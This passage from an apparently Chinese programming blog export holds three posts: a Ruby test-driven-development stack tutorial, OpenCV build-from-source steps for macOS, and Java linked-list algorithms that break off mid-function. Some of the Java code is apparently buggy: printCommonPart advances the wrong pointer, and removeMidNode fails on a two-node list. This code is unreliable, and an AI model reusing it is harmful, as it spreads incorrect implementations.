  attr_accessor <span class="token symbol">:empty</span><span class="token punctuation">,</span><span class="token symbol">:size</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span>
    <span class="token variable">@empty</span> <span class="token operator">=</span> <span class="token boolean">true</span>
    <span class="token variable">@size</span> <span class="token operator">=</span> <span class="token number">0</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">isEmpty</span></span><span class="token operator">?</span>
    empty
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">push</span></span><span class="token punctuation">(</span>ele<span class="token punctuation">)</span>
    <span class="token variable">@size</span> <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token variable">@empty</span> <span class="token operator">=</span> <span class="token boolean">false</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">pop</span></span>
    <span class="token variable">@empty</span> <span class="token operator">=</span> <span class="token boolean">true</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    我们定义size实例变量来保存状态，并在每次push时，size+1，这样断言通过。为了测试完整，我们再加一个测试</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_afterOnePush_isNotEmpty</span></span>
    <span class="token variable">@stack</span><span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    refute<span class="token punctuation">(</span><span class="token variable">@stack</span><span class="token punctuation">.</span>isEmpty<span class="token operator">?</span><span class="token punctuation">)</span>
    assert_equal<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">@stack</span><span class="token punctuation">.</span>size<span class="token punctuation">)</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    测试通过。回到第一法则，如果对空栈执行pop操作，应该会有个异常吧</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_poppingEmptyStack_raisesUnderflow</span></span>
    assert_raises <span class="token keyword">do</span>
      <span class="token variable">@stack</span><span class="token punctuation">.</span>pop
    <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    测试失败，我们还没定义这个异常类</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Underflow</span> <span class="token operator">&lt;</span> StandardError
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>​    断言失败，我们再修改生产代码</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">require_relative <span class="token string-literal"><span class="token string">'underflow'</span></span>
<span class="token keyword">class</span> <span class="token class-name">Stack</span>
  <span class="token comment"># ...</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">pop</span></span>
    <span class="token keyword">raise</span> Underflow <span class="token keyword">if</span> isEmpty<span class="token operator">?</span>
    <span class="token variable">@empty</span> <span class="token operator">=</span> <span class="token boolean">true</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    测试通过，再测试：当栈push一个数据时，也应该pop出相同的数据吧</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_afterPushingX_willPopX</span></span>
    <span class="token variable">@stack</span><span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    assert_equal<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">@stack</span><span class="token punctuation">.</span>pop<span class="token punctuation">)</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    测试失败，调整生产代码，我们加一个实例变量保存信息</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">require_relative <span class="token string-literal"><span class="token string">'underflow'</span></span>
<span class="token keyword">class</span> <span class="token class-name">Stack</span>
  attr_accessor <span class="token symbol">:empty</span><span class="token punctuation">,</span><span class="token symbol">:size</span><span class="token punctuation">,</span><span class="token symbol">:element</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span>
    <span class="token variable">@empty</span> <span class="token operator">=</span> <span class="token boolean">true</span>
    <span class="token variable">@size</span> <span class="token operator">=</span> <span class="token number">0</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">isEmpty</span></span><span class="token operator">?</span>
    empty
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">push</span></span><span class="token punctuation">(</span>ele<span class="token punctuation">)</span>
    <span class="token variable">@size</span> <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token variable">@empty</span> <span class="token operator">=</span> <span class="token boolean">false</span>
    <span class="token variable">@element</span> <span class="token operator">=</span> ele
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">pop</span></span>
    <span class="token keyword">raise</span> Underflow <span class="token keyword">if</span> isEmpty<span class="token operator">?</span>
    <span class="token variable">@empty</span> <span class="token operator">=</span> <span class="token boolean">true</span>
    <span class="token variable">@element</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    测试通过，已经写了这么多代码，你看的都崩溃了，觉得直接写一个栈不就完了嘛</p>
<hr>
<p>规则3：别挖金子</p>
<hr>
<p>​    在最开始尝试TDD时，你会急于解决较难或有趣的问题，你可能先写FILO行为，这个就是挖金子，我们有意避免测试与栈行为有关的东西，专注与周边行为。例如栈是否为空或栈大小。<br>为什么避免挖金子，因为如果过早挖金子，可能忽略周边所有细节。现在我们根据第一法子，编写FILO测试</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test_afterPushingXAndY_willPopYThenX</span></span>
    <span class="token variable">@stack</span><span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token variable">@stack</span><span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    assert_equal<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token variable">@stack</span><span class="token punctuation">.</span>pop<span class="token punctuation">)</span>
    assert_equal<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">@stack</span><span class="token punctuation">.</span>pop<span class="token punctuation">)</span>
  <span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    测试失败，我们发现抛出了<code>Underflow</code>,我们修改一下<code>isEmpty?</code>方法</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">require_relative <span class="token string-literal"><span class="token string">'underflow'</span></span>
<span class="token keyword">class</span> <span class="token class-name">Stack</span>
  <span class="token comment"># ...</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">isEmpty</span></span><span class="token operator">?</span>
    size <span class="token operator">==</span> <span class="token number">0</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    测试失败，<code>test_afterOnePushAndOnePop_isEmpty</code>这个测试中报错，好吧，我们在pop时没有size-1</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">require_relative <span class="token string-literal"><span class="token string">'underflow'</span></span>
<span class="token keyword">class</span> <span class="token class-name">Stack</span>
  <span class="token comment"># ...</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">pop</span></span>
    <span class="token keyword">raise</span> Underflow <span class="token keyword">if</span> isEmpty<span class="token operator">?</span>
    <span class="token variable">@size</span> <span class="token operator">-=</span> <span class="token number">1</span>
    <span class="token variable">@empty</span> <span class="token operator">=</span> <span class="token boolean">true</span>
    <span class="token variable">@element</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    就剩下最后一个断言失败了，FILO行为，我们开始修改</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">require_relative <span class="token string-literal"><span class="token string">'underflow'</span></span>
<span class="token keyword">class</span> <span class="token class-name">Stack</span>
  attr_accessor <span class="token symbol">:empty</span><span class="token punctuation">,</span><span class="token symbol">:size</span><span class="token punctuation">,</span><span class="token symbol">:elements</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span>
    <span class="token variable">@empty</span> <span class="token operator">=</span> <span class="token boolean">true</span>
    <span class="token variable">@size</span> <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token variable">@elements</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">isEmpty</span></span><span class="token operator">?</span>
    size <span class="token operator">==</span> <span class="token number">0</span>
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">push</span></span><span class="token punctuation">(</span>ele<span class="token punctuation">)</span>
    <span class="token variable">@size</span> <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token variable">@empty</span> <span class="token operator">=</span> <span class="token boolean">false</span>
    <span class="token variable">@elements</span> <span class="token operator">&lt;&lt;</span> ele
  <span class="token keyword">end</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">pop</span></span>
    <span class="token keyword">raise</span> Underflow <span class="token keyword">if</span> isEmpty<span class="token operator">?</span>
    ele <span class="token operator">=</span> <span class="token variable">@elements</span><span class="token punctuation">[</span>size<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token variable">@size</span> <span class="token operator">-=</span> <span class="token number">1</span>
    <span class="token variable">@empty</span> <span class="token operator">=</span> <span class="token boolean">true</span>
    ele
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    测试全部通过，我们已经完成了一个栈的基础行为啦，你会发现一个栈在我们不断测试中渐渐成型，虽然现在并不完善，但我们已经能感受到测试驱动开发的整个过程了。</p>
<p>​    也许你可以花点儿时间，利用测试驱动开发自己写一个队列结构。    </p>
]]></content>
      <categories>
        <category>Ruby</category>
      </categories>
      <tags>
        <tag>测试</tag>
      </tags>
  </entry>
  <entry>
    <title>opencv环境搭建</title>
    <url>//post/opencv/opencv%20%E5%85%A5%E9%97%A8%E4%BD%BF%E7%94%A8.html</url>
    <content><![CDATA[<h1 id="opencv-入门"><a href="#opencv-入门" class="headerlink" title="opencv 入门"></a>opencv 入门</h1><h2 id="环境下载与搭建"><a href="#环境下载与搭建" class="headerlink" title="环境下载与搭建"></a>环境下载与搭建</h2><h3 id="Windows用户"><a href="#Windows用户" class="headerlink" title="Windows用户"></a>Windows用户</h3><p>直接在官网下载 Windows 文件：<a href="https://opencv.org/releases/">https://opencv.org/releases/</a> 。然后参考这篇文章：<a href="https://blog.csdn.net/qianlixiaomage/article/details/108416400%E3%80%82%E8%AF%B4%E5%AE%9E%E8%AF%9DWindows%E4%B8%8A%E6%93%8D%E4%BD%9C%E5%A4%AA%E6%96%B9%E4%BE%BF%E4%BA%86%E3%80%82%E6%88%91%E7%94%A8Mac%E6%8D%A3%E9%BC%93%E4%BA%86%E5%8D%8A%E5%A4%A9%EF%BC%8C%E6%B0%94%E6%AD%BB%E3%80%82">https://blog.csdn.net/qianlixiaomage/article/details/108416400。说实话Windows上操作太方便了。我用Mac捣鼓了半天，气死。</a></p>
<img src="../../typora-user-images/image-20230220124942228.png" alt="image-20230220124942228" style="zoom:50%;" />

<h3 id="Mac用户"><a href="#Mac用户" class="headerlink" title="Mac用户"></a>Mac用户</h3><p>直接在官网下载 Sources 文件：<a href="https://opencv.org/releases/">https://opencv.org/releases/</a> 。并进行解压。</p>
<p>下载cmake：<code>brew install cmake</code></p>
<p>下载Ant：<a href="https://www.jianshu.com/p/bdca5215e9ca">https://www.jianshu.com/p/bdca5215e9ca</a>  这里是必须的，如果没有，最后无法生成jar包</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> opencv-4.7.0  <span class="token comment"># 这里是opencv源码包解压的文件地址</span>
<span class="token function">mkdir</span> build  
<span class="token builtin class-name">cd</span> build
cmake <span class="token parameter variable">-D</span> <span class="token assign-left variable">CMAKE_BUILD_TYPE</span><span class="token operator">=</span>RELEASE <span class="token parameter variable">-D</span> <span class="token assign-left variable">CMAKE_INSTALL_PREFIX</span><span class="token operator">=</span>/usr/local <span class="token punctuation">..</span> <span class="token comment"># 这俩点表示OpenCV的源码位置，不能省略</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>​        如果最后一句报错，就到上一层目录中找有没有：<code>CMakeCache.txt</code> 这是上一次cmake的缓存，删除即可。</p>
<p>​        这一步会耗费很长时间，如果中间耗时过久，在这里卡顿：<code>IPPICV: Download: ippicv_2019_lnx_intel64_general_20180723.tgz</code>,可以参考这篇文章：<a href="https://www.jianshu.com/p/3c2fc0da7398/">https://www.jianshu.com/p/3c2fc0da7398/</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span>
<span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<blockquote>
<p>这里应该在build/bin 文件下出现jar包，如果你没有</p>
</blockquote>
<p>​        参考这篇文章：<a href="https://blog.csdn.net/sinat_34163739/article/details/103497452">https://blog.csdn.net/sinat_34163739/article/details/103497452</a> ，检查你的配置是否都正常。</p>
<p>​        现在检查你有没有这个文件：<code>opencv-4.7.0/build/lib/libopencv_java470.dylib</code>，如果都没问题，说明你已经能操作opencv了</p>
<ul>
<li><p>打开一个Java项目</p>
</li>
<li><p>在Project Structure中Libraries中添加opencv的jar包</p>
<p><img src="../../typora-user-images/image-20230220130215311.png" alt="image-20230220130215311"></p>
</li>
<li><p>然后在opencv下添加：opencv-4.7.0/build/lib/libopencv_java470.dylib</p>
</li>
<li><p>验证是否加载成功：<code>System.loadLibrary(NATIVE_LIBRARY_NAME);  </code>如果正常，就说明没问题了。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>opencv</category>
      </categories>
      <tags>
        <tag>opencv</tag>
      </tags>
  </entry>
  <entry>
    <title>第二章：链表问题</title>
    <url>//post/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E9%93%BE%E8%A1%A8%E9%97%AE%E9%A2%98.html</url>
    <content><![CDATA[<h1 id="第二章：链表问题"><a href="#第二章：链表问题" class="headerlink" title="第二章：链表问题"></a>第二章：链表问题</h1><h2 id="打印两个有序链表的公共部分"><a href="#打印两个有序链表的公共部分" class="headerlink" title="打印两个有序链表的公共部分"></a>打印两个有序链表的公共部分</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 给定两个有序链表的头指针head1和head2,打印两个链表的公共部分
 * @param head1
 * @param head2
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printCommonPart</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head1<span class="token punctuation">,</span><span class="token class-name">Node</span> head2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 有序 则说明，我们可以用双指针思想，找到相同的点</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>head1 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> head2 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>head1<span class="token punctuation">.</span>value <span class="token operator">></span> head2<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            head1 <span class="token operator">=</span> head1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>head1<span class="token punctuation">.</span>value <span class="token operator">&lt;</span> head2<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            head2 <span class="token operator">=</span> head2<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 如果相等，说明到达了公共节点</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>head1<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            head1 <span class="token operator">=</span> head1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
            head2 <span class="token operator">=</span> head2<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="在单链表和双链表中删除倒数第K个节点"><a href="#在单链表和双链表中删除倒数第K个节点" class="headerlink" title="在单链表和双链表中删除倒数第K个节点"></a>在单链表和双链表中删除倒数第K个节点</h2><blockquote>
<p>单链表</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 单链表删除倒数第k个节点
 * 假如链表长度为N，则删除倒数第K个点，就需要找到倒数K点的前一个点，也就是N-K位置
 * 我们每遍历一个点，k-1
 * 这里需要想一下，比如：
 * 1->2->3 k=4 : 3 2 1 ,发现最终k>0 说明倒数第K个点，已经超出范围了
 * 1->2->3 k=3 : 2 1 0 ,发现k=0, 说明删除的就是头结点，返回头结点下一个
 * 1->2->3 k=2 : 1 0 -1,k&lt;0, 说明删除的点在中间 这时候我们从头遍历，K+1，则第一遍遍历为K-N,则第二遍当K=0时，则就是遍历到N-K的位置
 * @param head
 * @param lastKth
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">removeLastKthNode</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">,</span><span class="token keyword">int</span> lastKth<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> lastKth <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"输入参数有误"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 这里用一个指针遍历，因为第二遍我们还需要找到头结点</span>
    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        lastKth<span class="token operator">--</span><span class="token punctuation">;</span>
        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>lastKth <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"删除结点超出范围"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>lastKth <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> head<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 这里就剩下 K &lt; 0 情况</span>
    cur <span class="token operator">=</span> head<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>lastKth <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        lastKth<span class="token operator">++</span><span class="token punctuation">;</span>
        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    cur<span class="token punctuation">.</span>next <span class="token operator">=</span> cur<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
    <span class="token keyword">return</span> head<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>双链表</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 双链表结构与单链表就是多了个前指针，我们在删除时需要注意
 *
 * @param head
 * @param lastKth
 * @return
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">removeLastKthNode</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">,</span> <span class="token keyword">int</span> lastKth<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> lastKth <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"参数异常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        lastKth<span class="token operator">--</span><span class="token punctuation">;</span>
        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>lastKth <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        head <span class="token operator">=</span> head<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
        head<span class="token punctuation">.</span>before <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>lastKth <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        cur <span class="token operator">=</span> head<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>lastKth <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
            lastKth<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// 当前就找到了要删除的点</span>
        cur<span class="token punctuation">.</span>next <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
        <span class="token class-name">Node</span> tmp <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>tmp <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            tmp<span class="token punctuation">.</span>before <span class="token operator">=</span> cur<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> head<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="删除链表的中间节点"><a href="#删除链表的中间节点" class="headerlink" title="删除链表的中间节点"></a>删除链表的中间节点</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 删除中间节点：
 * 1->2 删除 1
 * 1->2->3 删除 2
 * 问题的关键就是要找到中间这个点，通过前一个点进行删除
 * @param head
 * @return
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">removeMidNode</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> head<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 利用快慢指针，快指针一次走两步，慢指针一次走一步</span>
  	<span class="token comment">// 这里快指针先走一步，则最终slow的下一个点就是中间点</span>
    <span class="token class-name">Node</span> fast <span class="token operator">=</span> head<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
    <span class="token class-name">Node</span> slow <span class="token operator">=</span> head<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>fast<span class="token punctuation">.</span>next <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
        fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    slow<span class="token punctuation">.</span>next <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
    <span class="token keyword">return</span> head<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="反转单向和双向链表"><a href="#反转单向和双向链表" class="headerlink" title="反转单向和双向链表"></a>反转单向和双向链表</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 反转单向链表
 *
 * @param head
 * @return
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">reverseList</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
